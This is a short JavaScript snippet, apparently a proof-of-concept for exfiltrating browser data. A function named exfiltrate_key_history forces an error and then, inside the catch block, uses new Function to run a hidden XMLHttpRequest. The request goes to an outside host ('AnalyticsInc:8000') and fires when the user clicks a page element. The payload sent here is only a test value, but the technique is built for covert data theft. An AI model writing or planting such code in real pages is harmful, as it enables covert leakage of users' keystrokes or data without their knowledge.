function exfiltrate_key_history() {
	// Try/Catch Error Handler
    // Exfiltrate data using XMLHTTP request
    try {
		window.NotExistingFunction();
	}
	catch (e) {
		var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=error2", true);xmlhttp.send(null);';
		var tmpFunc=new Function(exp);
		tmpFunc();
	}
}

document.getElementById('test').onclick = exfiltrate_key_history;